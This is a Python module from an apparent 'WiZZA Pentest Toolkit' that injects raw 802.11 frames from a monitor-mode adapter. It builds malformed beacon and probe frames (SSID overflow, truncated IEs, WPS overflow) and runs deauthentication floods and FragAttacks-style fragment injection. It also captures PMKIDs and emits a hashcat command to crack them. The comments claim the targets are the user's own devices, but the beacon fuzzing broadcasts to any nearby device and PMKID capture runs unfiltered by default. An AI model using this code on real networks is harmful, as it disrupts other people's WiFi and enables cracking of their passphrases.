"""
wifi_probe.py — WiFi Attack Surface Research Module
WiZZA Pentest Toolkit

Tests WiFi stack on own devices using malformed 802.11 frames.
Attack surfaces:
  1. Beacon frame parsing — malformed SSID, rates, capabilities
  2. Probe response — overflow information elements
  3. Management frame fuzzing — deauth, disassoc, action frames
  4. WPS information element — overflow/malformed WPS IE
  5. 802.11w (PMF) — protected management frame bypass research
  6. PMKID capture — WPA2/3 handshake research
  7. EAP fuzzing — 802.1X authentication protocol
  8. Fragmentation attack — overlapping MSDU fragments

Requirements:
  apt install aircrack-ng scapy python3-scapy
  Wireless adapter supporting monitor mode + packet injection

Usage:
  from wifi_probe import beacon_fuzz, probe_fuzz, deauth_flood
  from wifi_probe import pmkid_capture, full_wifi_probe
"""

import os
import re
import json
import time
import struct
import random
import subprocess
import socket
from datetime import datetime
from pathlib import Path

# ── Interface Management ──────────────────────────────────────────────────────

def get_wireless_interfaces() -> list:
    """List available wireless interfaces."""
    interfaces = []
    try:
        out = subprocess.check_output(
            ["iwconfig"], text=True, stderr=subprocess.STDOUT
        )
        for line in out.splitlines():
            if "IEEE 802.11" in line or "ESSID" in line:
                iface = line.split()[0]
                if iface not in interfaces:
                    interfaces.append(iface)
    except Exception:
        pass

    # Also check /proc/net/wireless
    try:
        with open("/proc/net/wireless") as f:
            for line in f.readlines()[2:]:
                iface = line.strip().split(":")[0].strip()
                if iface and iface not in interfaces:
                    interfaces.append(iface)
    except Exception:
        pass

    return interfaces


def enable_monitor_mode(iface: str) -> dict:
    """Put wireless interface into monitor mode."""
    result = {"iface": iface, "monitor_iface": None, "success": False, "error": None}

    # Try airmon-ng
    try:
        # Kill conflicting processes
        subprocess.run(["airmon-ng", "check", "kill"],
                       capture_output=True, timeout=10)
        proc = subprocess.run(
            ["airmon-ng", "start", iface],
            capture_output=True, text=True, timeout=15
        )
        # Parse new monitor interface name
        for line in proc.stdout.splitlines():
            match = re.search(r'monitor mode.*?(wlan\w+mon|\w+mon)', line)
            if match:
                result["monitor_iface"] = match.group(1)
                result["success"] = True
                return result
        # airmon-ng succeeded but didn't print the new name — check
        out = subprocess.check_output(["iwconfig"], text=True, stderr=subprocess.STDOUT)
        for line in out.splitlines():
            if "mon" in line and "Mode:Monitor" in out:
                result["monitor_iface"] = line.split()[0]
                result["success"] = True
                return result
    except FileNotFoundError:
        pass
    except Exception:
        pass

    # Fallback: ip/iw
    try:
        mon_iface = f"{iface}mon"
        subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
        subprocess.run(["iw", iface, "set", "monitor", "none"], check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
        result["monitor_iface"] = iface
        result["success"] = True
    except Exception as e:
        result["error"] = str(e)

    return result


def disable_monitor_mode(mon_iface: str, orig_iface: str = None) -> bool:
    """Restore interface to managed mode."""
    try:
        # airmon-ng stop
        proc = subprocess.run(
            ["airmon-ng", "stop", mon_iface],
            capture_output=True, timeout=10
        )
        if proc.returncode == 0:
            return True
    except Exception:
        pass

    try:
        iface = orig_iface or mon_iface.replace("mon", "")
        subprocess.run(["ip", "link", "set", mon_iface, "down"], capture_output=True)
        subprocess.run(["iw", mon_iface, "set", "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True)
        return True
    except Exception:
        return False


# ── 802.11 Frame Builders ─────────────────────────────────────────────────────

def _mac_bytes(mac: str) -> bytes:
    """Convert MAC string to bytes."""
    if mac == "broadcast":
        return b'\xff\xff\xff\xff\xff\xff'
    try:
        return bytes(int(x, 16) for x in mac.split(':'))
    except Exception:
        return bytes(random.getrandbits(8) for _ in range(6))


def _random_mac() -> str:
    """Generate random MAC address."""
    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))


def make_beacon(ssid: str = "WiZZA-Test", bssid: str = None,
                variant: str = "normal", channel: int = 6) -> bytes:
    """
    Build 802.11 Beacon frame.
    """
    if bssid is None:
        bssid = _random_mac()

    bssid_bytes = _mac_bytes(bssid)
    broadcast   = b'\xff\xff\xff\xff\xff\xff'

    # 802.11 MAC header
    frame_ctrl = struct.pack('<H', 0x0080)  # Type=Mgmt, Subtype=Beacon
    duration   = b'\x00\x00'
    seq_ctrl   = struct.pack('<H', random.randint(0, 0xFFF0))

    mac_hdr = frame_ctrl + duration + broadcast + bssid_bytes + bssid_bytes + seq_ctrl

    # Fixed fields: timestamp(8) + interval(2) + capabilities(2)
    timestamp    = struct.pack('<Q', int(time.time() * 1000000))
    interval     = struct.pack('<H', 100)  # 100 TU = 102.4ms
    capabilities = struct.pack('<H', 0x0421)  # ESS + Short Preamble + DSSS-OFDM

    fixed = timestamp + interval + capabilities

    # Information Elements
    def ie(tag: int, data: bytes) -> bytes:
        return bytes([tag, len(data)]) + data

    def ie_ssid(ssid_str: str) -> bytes:
        return ie(0, ssid_str.encode('utf-8', errors='replace')[:32])

    # Supported rates
    rates = ie(1, bytes([0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C]))
    # DS Parameter Set (channel)
    ds = ie(3, bytes([channel]))

    if variant == "normal":
        ssid_ie = ie_ssid(ssid)
        body = fixed + ssid_ie + rates + ds

    elif variant == "overflow_ssid":
        # SSID field with length claiming 255 bytes (max 32)
        ssid_ie = bytes([0x00, 0xFF]) + b'A' * 255
        body = fixed + ssid_ie + rates + ds

    elif variant == "zero_ssid":
        # Hidden network (zero-length SSID)
        ssid_ie = bytes([0x00, 0x00])
        body = fixed + ssid_ie + rates + ds

    elif variant == "giant_ie":
        # IE with maximum length payload
        ssid_ie = ie_ssid(ssid)
        big_ie = bytes([0xDD, 0xFF]) + b'\xAA' * 255  # Vendor-specific, max len
        body = fixed + ssid_ie + rates + ds + big_ie

    elif variant == "truncated_ie":
        # IE claims 10 bytes but only 3 follow
        ssid_ie = ie_ssid(ssid)
        bad_ie = bytes([0x01, 0x0A, 0x82, 0x84])  # Rates claiming 10 bytes, only 2
        body = fixed + ssid_ie + bad_ie

    elif variant == "duplicate_ie":
        # Multiple SSID IEs (spec allows only one)
        ssid_ie = ie_ssid(ssid)
        body = fixed + ssid_ie + ssid_ie + ssid_ie + rates + ds

    elif variant == "null_ssid":
        # SSID containing null bytes
        ssid_ie = bytes([0x00, 0x10]) + b'WIZZA\x00TEST\x00\x00\x00\x00\x00\x00'
        body = fixed + ssid_ie + rates + ds

    elif variant == "long_name":
        # Vendor-specific IE with very long OUI-prefixed name
        vendor = b'\x00\x50\xf2'  # Microsoft OUI
        payload = b'A' * 252
        vendor_ie = bytes([0xDD, len(vendor + payload)]) + vendor + payload
        ssid_ie = ie_ssid(ssid)
        body = fixed + ssid_ie + rates + ds + vendor_ie

    elif variant == "wps_overflow":
        # WPS IE (0xDD + MS OUI + type 0x04) with overflow
        wps_oui   = b'\x00\x50\xf2\x04'
        wps_data  = b'\x10\x4a\x00\x01\x10'  # Version
        wps_data += b'\x10\x22\x00\x01\x04'  # Request type
        wps_data += b'\x10\x47\x01\x00' + b'A' * 256  # UUID overflow
        wps_ie    = bytes([0xDD, min(255, len(wps_oui + wps_data))]) + wps_oui + wps_data[:251]
        ssid_ie   = ie_ssid(ssid)
        body      = fixed + ssid_ie + rates + ds + wps_ie

    else:
        ssid_ie = ie_ssid(ssid)
        body = fixed + ssid_ie + rates + ds

    return mac_hdr + body


def make_probe_response(ssid: str, bssid: str, dst: str,
                        variant: str = "normal") -> bytes:
    """Build 802.11 Probe Response frame."""
    bssid_bytes = _mac_bytes(bssid)
    dst_bytes   = _mac_bytes(dst)

    frame_ctrl = struct.pack('<H', 0x0050)  # Probe Response
    duration   = b'\x00\x00'
    seq_ctrl   = struct.pack('<H', random.randint(0, 0xFFF0))

    mac_hdr = frame_ctrl + duration + dst_bytes + bssid_bytes + bssid_bytes + seq_ctrl
    return mac_hdr + make_beacon(ssid, bssid, variant)[len(mac_hdr):]


def make_deauth(bssid: str, client: str = "broadcast",
                reason: int = 7) -> bytes:
    """Build 802.11 Deauthentication frame."""
    bssid_bytes  = _mac_bytes(bssid)
    client_bytes = _mac_bytes(client)

    frame_ctrl = struct.pack('<H', 0x00C0)  # Deauth
    duration   = b'\x00\x00'
    seq_ctrl   = struct.pack('<H', random.randint(0, 0xFFF0))
    reason_code = struct.pack('<H', reason)

    return (frame_ctrl + duration + client_bytes + bssid_bytes +
            bssid_bytes + seq_ctrl + reason_code)


def make_action_frame(bssid: str, dst: str, category: int = 4,
                      action: int = 0, payload: bytes = b'') -> bytes:
    """Build 802.11 Action frame (used for spectrum mgmt, QoS, HT, VHT, etc.)."""
    bssid_bytes = _mac_bytes(bssid)
    dst_bytes   = _mac_bytes(dst)

    frame_ctrl = struct.pack('<H', 0x00D0)  # Action
    duration   = b'\x00\x00'
    seq_ctrl   = struct.pack('<H', random.randint(0, 0xFFF0))
    action_body = bytes([category, action]) + payload

    return (frame_ctrl + duration + dst_bytes + bssid_bytes +
            bssid_bytes + seq_ctrl + action_body)


# ── Injection via Scapy ───────────────────────────────────────────────────────

def inject_frames(frames: list, iface: str, count: int = 1,
                  delay: float = 0.1) -> dict:
    """
    Inject raw 802.11 frames using Scapy.
    iface must be in monitor mode.
    """
    result = {"sent": 0, "errors": []}

    try:
        from scapy.all import sendp, RadioTap, Dot11
        from scapy.layers.dot11 import RadioTap

        for i in range(count):
            for raw_frame in frames:
                try:
                    # Wrap in RadioTap for injection
                    pkt = RadioTap() / raw_frame
                    sendp(pkt, iface=iface, verbose=False)
                    result["sent"] += 1
                except Exception as e:
                    result["errors"].append(str(e)[:80])
                time.sleep(delay)

    except ImportError:
        # Fallback: use aireplay-ng or raw socket
        try:
            for i in range(count):
                for raw_frame in frames:
                    # Write frame to temp file and inject
                    tmp = f"/tmp/wizza_frame_{i}.cap"
                    # Add PCAP header
                    pcap_global = struct.pack('<IHHiIII',
                        0xA1B2C3D4, 2, 4, 0, 0, 65535, 105)  # LINKTYPE_IEEE802_11
                    pcap_rec = struct.pack('<IIII',
                        int(time.time()), 0, len(raw_frame), len(raw_frame))
                    with open(tmp, 'wb') as f:
                        f.write(pcap_global + pcap_rec + raw_frame)

                    subprocess.run(
                        ["aireplay-ng", "--inject", tmp, iface],
                        capture_output=True, timeout=5
                    )
                    os.unlink(tmp)
                    result["sent"] += 1
                    time.sleep(delay)
        except Exception as e:
            result["errors"].append(str(e)[:80])

    return result


# ── Beacon Fuzzing ────────────────────────────────────────────────────────────

def beacon_fuzz(iface: str, target_bssid: str = None,
                count: int = 100, channel: int = 6) -> dict:
    """
    Fuzz nearby devices by broadcasting malformed beacon frames.
    Tests 802.11 beacon parser in WiFi firmware/driver.
    """
    result = {
        "iface":    iface,
        "channel":  channel,
        "sent":     0,
        "variants": [],
        "errors":   [],
    }

    variants = [
        "overflow_ssid", "zero_ssid", "giant_ie", "truncated_ie",
        "duplicate_ie", "null_ssid", "long_name", "wps_overflow",
    ]

    frames = []
    for v in variants:
        bssid = target_bssid or _random_mac()
        frame = make_beacon("WiZZA", bssid, variant=v, channel=channel)
        frames.append(frame)
        result["variants"].append(v)

    # Set channel
    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)],
                       capture_output=True, timeout=5)
    except Exception:
        pass

    inject_result = inject_frames(frames, iface, count=count // len(variants))
    result["sent"]   = inject_result["sent"]
    result["errors"] = inject_result["errors"]

    return result


# ── Deauth Flood (for testing own AP / device) ────────────────────────────────

def deauth_test(iface: str, bssid: str, client: str = "broadcast",
                count: int = 10) -> dict:
    """
    Send deauthentication frames to test PMF (802.11w) implementation.
    If PMF is disabled, client will disconnect (vulnerability confirmed).
    """
    result = {"bssid": bssid, "client": client, "sent": 0, "errors": []}

    frames = []
    for reason in [1, 2, 3, 4, 5, 6, 7]:  # Various reason codes
        frames.append(make_deauth(bssid, client, reason))

    inject_result = inject_frames(frames, iface, count=count)
    result["sent"]   = inject_result["sent"]
    result["errors"] = inject_result["errors"]

    if result["sent"] > 0:
        result["note"] = (
            "If target disconnected → PMF (802.11w) not enabled → "
            "vulnerable to deauth attack"
        )

    return result


# ── PMKID Capture ─────────────────────────────────────────────────────────────

def pmkid_capture(iface: str, bssid: str = None,
                  timeout: int = 60) -> dict:
    """
    Capture PMKID from WPA2/3 handshake (no client required).
    Uses hcxdumptool for passive capture, then hcxtools to extract PMKID.
    """
    result = {
        "iface":   iface,
        "bssid":   bssid,
        "pmkids":  [],
        "hashes":  [],
        "crack_cmd": None,
        "errors":  [],
    }

    cap_file  = "/tmp/wizza_pmkid.pcapng"
    hash_file = "/tmp/wizza_pmkid.hash"

    # Build hcxdumptool command
    cmd = ["hcxdumptool", "-i", iface, "-o", cap_file,
           "--enable_status=1", "--active_beacon"]
    if bssid:
        cmd += ["--filterlist_ap=" + bssid, "--filtermode=2"]

    print(f"[*] Capturing PMKID for {timeout}s...")
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(timeout)
        proc.terminate()
        proc.wait(timeout=5)
    except FileNotFoundError:
        result["errors"].append("hcxdumptool not found — apt install hcxdumptool")
        return result
    except Exception as e:
        result["errors"].append(str(e))

    # Extract PMKID hashes
    if os.path.exists(cap_file):
        try:
            proc = subprocess.run(
                ["hcxpcapngtool", "-o", hash_file, cap_file],
                capture_output=True, text=True, timeout=30
            )
            if os.path.exists(hash_file):
                with open(hash_file) as f:
                    hashes = [l.strip() for l in f.readlines() if l.strip()]
                result["hashes"]    = hashes
                result["pmkids"]    = [h.split('*')[3] for h in hashes if '*' in h]
                result["crack_cmd"] = (
                    f"hashcat -m 22000 {hash_file} "
                    "/usr/share/wordlists/rockyou.txt --force"
                )
                print(f"[+] Captured {len(hashes)} PMKID hash(es)")
        except FileNotFoundError:
            result["errors"].append("hcxpcapngtool not found — apt install hcxtools")
        except Exception as e:
            result["errors"].append(str(e))
    else:
        result["errors"].append("No capture file created")

    return result


# ── Fragmentation Attack Research ─────────────────────────────────────────────

def fragmentation_research(iface: str, bssid: str, client: str) -> dict:
    """
    Research 802.11 fragmentation/reassembly vulnerabilities.
    Covers FragAttacks (CVE-2020-24586, 24587, 24588 class).
    Tests own AP + own client.
    """
    result = {"sent": 0, "variants": [], "errors": []}

    def make_fragment(payload: bytes, frag_num: int, more_frags: bool,
                      seq: int, bssid: str, src: str, dst: str) -> bytes:
        """Build a single 802.11 fragment."""
        bssid_b = _mac_bytes(bssid)
        src_b   = _mac_bytes(src)
        dst_b   = _mac_bytes(dst)

        fc_flags = 0x0008  # Data frame
        if more_frags:
            fc_flags |= 0x0400  # More Fragments bit

        frame_ctrl = struct.pack('<H', fc_flags)
        duration   = b'\x00\x00'
        seq_ctrl   = struct.pack('<H', (seq << 4) | (frag_num & 0xF))

        return frame_ctrl + duration + dst_b + src_b + bssid_b + seq_ctrl + payload

    variants = {
        "overlapping_fragments": "Send fragment 2 twice with different content",
        "cache_poisoning":       "Mix plaintext and encrypted fragments",
        "giant_reassembled":     "Fragments that reassemble to > 7935 bytes (A-MSDU limit)",
        "wrong_sequence":        "Fragment with wrong sequence number",
    }

    for name, desc in variants.items():
        result["variants"].append({"name": name, "description": desc})

    frames = []
    seq = random.randint(0, 0xFFF)

    # Fragment 1: normal
    frames.append(make_fragment(b'AAAA', 0, True, seq, bssid, bssid, client))
    # Fragment 2: overlap (send twice with different content)
    frames.append(make_fragment(b'BBBB', 1, False, seq, bssid, bssid, client))
    frames.append(make_fragment(b'CCCC', 1, False, seq, bssid, bssid, client))

    inject_result = inject_frames(frames, iface, count=5)
    result["sent"]   = inject_result["sent"]
    result["errors"] = inject_result["errors"]

    return result


# ── Full WiFi Probe ────────────────────────────────────────────────────────────

def full_wifi_probe(iface: str = None, target_bssid: str = None,
                    own_ap_bssid: str = None, own_client: str = None) -> dict:
    """
    Full WiFi attack surface research session.
    iface: wireless interface (will be put in monitor mode)
    target_bssid: BSSID of own AP to test against
    """
    result = {
        "timestamp":  datetime.now().isoformat(),
        "iface":      iface,
        "monitor":    {},
        "beacon_fuzz": {},
        "deauth_test": {},
        "pmkid":      {},
        "findings":   [],
    }

    # Auto-detect interface
    if not iface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            result["error"] = "No wireless interfaces found"
            return result
        iface = ifaces[0]
        result["iface"] = iface
        print(f"[*] Auto-selected interface: {iface}")

    print(f"\n[1/4] Enabling monitor mode on {iface}...")
    result["monitor"] = enable_monitor_mode(iface)
    mon_iface = result["monitor"].get("monitor_iface", iface)
    if result["monitor"]["success"]:
        print(f"  [+] Monitor mode: {mon_iface}")
    else:
        print(f"  [-] Monitor mode failed: {result['monitor'].get('error')}")
        print(f"      Continuing with {iface} (injection may fail)")
        mon_iface = iface

    print("\n[2/4] Beacon frame fuzzing (100 malformed beacons)...")
    result["beacon_fuzz"] = beacon_fuzz(mon_iface, target_bssid, count=100)
    print(f"  Sent: {result['beacon_fuzz']['sent']}")

    if own_ap_bssid:
        print(f"\n[3/4] Deauth test on own AP ({own_ap_bssid})...")
        result["deauth_test"] = deauth_test(
            mon_iface, own_ap_bssid,
            client=own_client or "broadcast",
            count=5
        )
        print(f"  Sent: {result['deauth_test']['sent']}")
        if result["deauth_test"].get("note"):
            print(f"  {result['deauth_test']['note']}")

    print("\n[4/4] PMKID capture (30s)...")
    result["pmkid"] = pmkid_capture(mon_iface, target_bssid, timeout=30)
    if result["pmkid"]["hashes"]:
        print(f"  [+] {len(result['pmkid']['hashes'])} PMKID(s) captured")
        print(f"  Crack: {result['pmkid']['crack_cmd']}")
        result["findings"].append({
            "type":    "PMKID captured",
            "count":   len(result["pmkid"]["hashes"]),
            "crack":   result["pmkid"]["crack_cmd"],
        })

    # Restore managed mode
    disable_monitor_mode(mon_iface, iface)
    print(f"\n[+] WiFi probe complete. {len(result['findings'])} findings.")
    return result


# ── Self-test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== wifi_probe.py self-test ===\n")

    print("[1] Wireless interfaces:")
    ifaces = get_wireless_interfaces()
    print(f"    Found: {ifaces or ['none']}")

    print("\n[2] Beacon frame generation:")
    variants = ["normal", "overflow_ssid", "zero_ssid", "giant_ie",
                "truncated_ie", "duplicate_ie", "null_ssid", "wps_overflow"]
    for v in variants:
        frame = make_beacon("TestSSID", "aa:bb:cc:dd:ee:ff", variant=v)
        print(f"    {v:20}: {len(frame)} bytes")

    print("\n[3] Deauth frame generation:")
    deauth = make_deauth("aa:bb:cc:dd:ee:ff", "broadcast", reason=7)
    print(f"    Deauth frame: {len(deauth)} bytes = {deauth.hex()[:40]}...")

    print("\n[4] Action frame generation:")
    action = make_action_frame("aa:bb:cc:dd:ee:ff", "ff:ff:ff:ff:ff:ff",
                               category=4, action=0, payload=b'\x00' * 16)
    print(f"    Action frame: {len(action)} bytes")

    print("\nDone.")
